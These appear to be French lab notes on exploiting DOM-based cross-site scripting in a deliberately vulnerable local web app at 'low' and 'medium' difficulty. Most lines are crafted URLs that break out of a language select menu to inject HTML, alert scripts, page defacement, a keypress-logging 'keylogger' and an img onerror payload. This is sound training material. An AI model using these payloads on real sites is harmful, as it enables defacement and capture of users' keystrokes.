# XSS DOM Low

formulaire qui contient un menu déroulant qui permet de sélectionner une langue : fr / en / ....

Formulaire utilise la méthode $_GET pour envoyer les informations vers le serveur

<http://127.0.0.1:4280/vulnerabilities/xss_d/?default=German>
<http://127.0.0.1:4280/vulnerabilities/xss_d/?default=bonjour>
http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<h1>Titre</h1>
http://127.0.0.1:4280/vulnerabilities/xss_d/?default="><h1>Titre</h1>
http://127.0.0.1:4280/vulnerabilities/xss_d/?default=</option><h1>Titre</h1></select>


%3Ch1%3ETitre%3C/h1%3E

échappement mais dans ce cas en html 

<  => %3C
>  => %3E

option value=""><h1>Titre</h1> "


http://127.0.0.1:4280/vulnerabilities/xss_d/?default=English

http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>alert("virus")</script>
http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>alert("virus")</script>


http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>document.querySelector("h1").innerHTML ="virus" </script>

// keylogger 

window.addEventListener("keypress", function(e){ console.log(e.key) })

http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>window.addEventListener("keypress", function(e){ console.log(e.key) })</script>


# Niveau medium

http://127.0.0.1:4280/vulnerabilities/xss_d/?default=</select><img src='' onerror='alert(1)'>